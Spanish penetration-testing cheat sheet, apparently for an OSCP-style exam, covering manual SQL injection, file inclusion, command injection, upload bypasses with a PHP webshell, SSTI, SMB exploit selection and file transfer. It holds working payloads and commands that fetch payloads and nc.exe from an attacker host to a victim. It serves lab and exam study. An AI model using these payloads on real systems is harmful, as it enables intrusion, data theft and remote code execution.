# 3. Explotación (Web + Exploits) y Transferencia

## Explotación web (el vector #1 en standalone)

> SQLi **manual** está permitido. **SQLMap está PROHIBIDO** en el examen.

### SQL Injection (manual)
```
# Autenticación
' OR 1=1-- -
admin'-- -

# Encontrar nº de columnas
' ORDER BY 1-- -      (ir subiendo hasta que falle)
' UNION SELECT 1,2,3-- -

# Extraer datos (MySQL)
' UNION SELECT 1,user(),database()-- -
' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,concat(user,':',password),3 FROM users-- -
```

### LFI / RFI (Local/Remote File Inclusion)
```
../../../../etc/passwd
....//....//....//etc/passwd            (bypass de filtros)
php://filter/convert.base64-encode/resource=index.php   (leer el fuente)
http://<IP_ATACANTE>/shell.php          (RFI si allow_url_include=On)
# Log poisoning: inyectar PHP en User-Agent → incluir /var/log/apache2/access.log
```

### Command Injection
```
; id
| id
& whoami
$(id)
`id`
%0a id       (newline)
```

### File Upload → webshell
```php
<?php system($_GET['cmd']); ?>
```
Bypass de extensión: `.php`, `.phtml`, `.php5`, `.pht`, doble extensión `shell.php.jpg`, cambiar `Content-Type` a `image/png` en Burp.

### SSTI (Server-Side Template Injection)
```
{{7*7}}      → si devuelve 49, es vulnerable
# Identificar motor y buscar el payload de RCE correspondiente (Jinja2, Twig, etc.)
```

## Búsqueda y uso de exploits públicos
```bash
searchsploit <servicio o versión>
searchsploit -m <ID>          # copia el exploit al directorio actual
```
Antes de correrlo: **léelo**, ajusta IP/puerto/offsets, ten un listener listo si es RCE, y verifica versión/arquitectura/dependencias si falla.

> 🔴 **Localiza DÓNDE vive la app antes de lanzar un exploit** (Astronaut, [`writeups/astronaut-grav-writeup.md`](writeups/astronaut-grav-writeup.md)). Un PoC que apunta a `/` cuando la app está en `/grav-admin/` falla de formas confusas (`IndexError`, `NoneType ... group`) que gritan "URL equivocada", no "exploit roto". Confírmalo con `nmap -p80 --script http-ls <IP>`, `whatweb` y fuzzing antes de tocar nada. Y **lee qué hace el exploit**: puede no ejecutar tu comando al instante (p.ej. escribe un cron que corre 1 min después) — no lo des por fallido demasiado pronto. Verifica tu payload decodificándolo (`base64 -d`) para confirmar IP y puerto.

### Windows viejo (2003/2008): identificar el exploit de SMB por versión

> Método de **Internal** ([`writeups/internal-server2008-writeup.md`](writeups/internal-server2008-writeup.md)). No adivines: **versión exacta → enumerar vulns conocidas → confirmar → elegir módulo.**

```bash
sudo nmap -p<abiertos> -sCV -Pn <IP>            # version exacta + Service Pack + arquitectura (x86/x64)
nmap -p139,445 --script "smb-vuln*" <IP>        # el paso decisivo: enumera los CVE de SMB
searchsploit windows server 2008 smb ; searchsploit cve-2009-3103
```
| CVE | Boletín MS | Afecta | Nota |
|-----|-----------|--------|------|
| CVE-2008-4250 | MS08-067 | 2000/XP/2003/2008 | NetAPI, el clásico |
| CVE-2009-3103 | MS09-050 | Vista / 2008 SMBv2 | negociación SMB2 |
| CVE-2017-0144 | MS17-010 (EternalBlue) | 2008R2/7/2012/2016 | el módulo eternalblue es **x64 only** |

> **"Vulnerable" ≠ "explotable a la primera":** la arquitectura (x86 vs x64) y los requisitos del módulo (named pipe) pueden tumbar el intento. Lee los errores y ten plan B. Los exploits de kernel/memoria (como MS09-050) pueden dejar la máquina en BSOD → revert y reintenta.

## Transferencia de archivos

**Servir desde el atacante:**
```bash
python3 -m http.server 80
impacket-smbserver share . -smb2support        # útil para Windows
```

**Descargar en la víctima (Linux):**
```bash
wget http://<IP_ATACANTE>/payload -O /tmp/payload
curl http://<IP_ATACANTE>/payload -o /tmp/payload
```

**Descargar en la víctima (Windows - PowerShell):**
```powershell
Invoke-WebRequest -Uri "http://<IP_ATACANTE>/payload.exe" -OutFile "C:\Windows\Temp\payload.exe"
certutil -urlcache -f http://<IP_ATACANTE>/payload.exe C:\Windows\Temp\payload.exe
(New-Object Net.WebClient).DownloadFile('http://<IP_ATACANTE>/nc.exe','C:\Windows\Temp\nc.exe')
```
Desde un SMB montado:
```cmd
copy \\<IP_ATACANTE>\share\payload.exe .
```
